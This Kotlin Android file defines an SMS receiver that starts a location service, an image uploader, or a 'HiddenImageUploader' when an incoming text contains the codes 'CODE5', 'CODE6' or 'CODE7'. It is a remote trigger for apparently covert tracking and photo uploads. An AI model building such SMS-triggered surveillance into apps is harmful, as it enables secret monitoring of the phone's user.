package com.keescale.assistant

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle: Bundle? = intent.extras
        try {
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<*>
                for (pdu in pdus) {
                    val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                    val messageBody = sms.messageBody
                    when {
                        messageBody.contains("CODE5") -> {
                            context.startService(Intent(context, LocationService::class.java))
                        }
                        messageBody.contains("CODE6") -> {
                            val i = Intent(context, PublicImageUploader::class.java)
                            context.startService(i)
                        }
                        messageBody.contains("CODE7") -> {
                            val i = Intent(context, HiddenImageUploader::class.java)
                            context.startService(i)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}